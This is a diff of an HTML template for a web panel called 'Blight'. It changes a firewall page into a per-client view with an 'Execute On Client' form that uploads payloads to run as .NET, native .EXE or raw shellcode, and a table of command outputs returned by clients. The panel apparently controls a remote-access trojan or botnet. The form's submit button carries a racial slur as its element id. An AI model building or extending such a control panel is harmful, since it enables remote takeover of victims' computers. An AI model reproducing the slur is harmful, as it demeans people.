@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blight - Firewall</title>
+    <title>Blight - Individual</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <link rel="stylesheet" href="{{ url_for('static',filename='css/style.css') }}">
 </head>
@@ -26,7 +26,7 @@
 
                     <li><p class="work-sans-light">Server Managment</p></li>
 
-                    <li class="active"><a href="firewall" class="work-sans-normal sidebar-link"><i class="fas fa-ban"></i>Firewall</a></li>
+                    <li><a href="firewall" class="work-sans-normal sidebar-link"><i class="fas fa-ban"></i>Firewall</a></li>
                     <li><a href="server_logs" class="work-sans-normal sidebar-link"><i class="fas fa-code"></i>Server Logs</a></li>
                     <li><a href="settings" class="work-sans-normal sidebar-link"><i class="fas fa-cog"></i>Settings</a></li>
 
@@ -38,31 +38,63 @@
                 </ul>
             </div>
         </aside>
+
         <main class="content">
 
+            <br>
+
+            <div class="forms">
+                <button onclick="openLightbox(0)" class="loadCreationButton">
+                    <i class="fa-solid fa-file"></i>
+                    Execute On Client
+                </button>
+            </div>
+
+            <div id="lightboxesContainer">
+
+                <div class="lightbox">
+                    <div class="forms">
+                        <div class="form-container">
+                        
+                            <h1 class="work-sans-light"><center>Payload Execution</center></h1>
+                            <hr>
+                            <form action="#" method="post"  enctype=multipart/form-data>
+                                <label for="name">Execution Type</label>
+                                <select name="execution_type">
+                                    <option value=".EXE | DOTNET Execution">.EXE | DOTNET Execution</option>
+                                    <option value=".BIN | Shellcode Execution">.BIN | Shellcode Execution</option>
+                                    <option value=".EXE | Native Execution">.EXE | Native Execution</option>
+                                </select>
+
+                                <label for="message">Payload</label>
+                                <input name="payload" type="file">
+
+                                <input id="nigga" type="submit" value="Submit">
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+          
             <table>
                 <thead>
                     <tr>
-                        <th>IP Address</th>
-                        <th>Client ID</th>
-                        <th>When Unbanned</th>
-                        <th>Reason</th>
-                        <th>Action</th>
+                        <th>Command Type</th>
+                        <th>Command Args</th>
+                        <th>Output</th>
+                        <th>Time To Complete</th>
+                        <th>Time Recieved</th>
                     </tr>
                 </thead>
                 <tbody>
-
-                    {% for block in block_list %}
+                    {% for output in new_outputs_list %}
                     <tr>
-                        <td>{{ block.ip }}</td>
-                        <td>{{ block.client_id }}</td>
-                        <td>{{ block.banned_until }}</td>
-                        <td>{{ block.reason }}</td>
-                        <td>
-                            <button class="allow-button" onclick="delete_block('{{ block.block_id }}')">
-                                <i class="fa-solid fa-door-open"></i> Allow
-                            </button>
-                        </td>
+                        <td>{{ output.cmd_type }}</td>
+                        <td>{{ output.cmd_args }}</td>
+                        <td>{{ output.output }}</td>
+                        <td>{{ output.time_to_complete }}</td>
+                        <td>{{ output.time_recieved }}</td>
                     </tr>
                     {% endfor %}
                 </tbody>
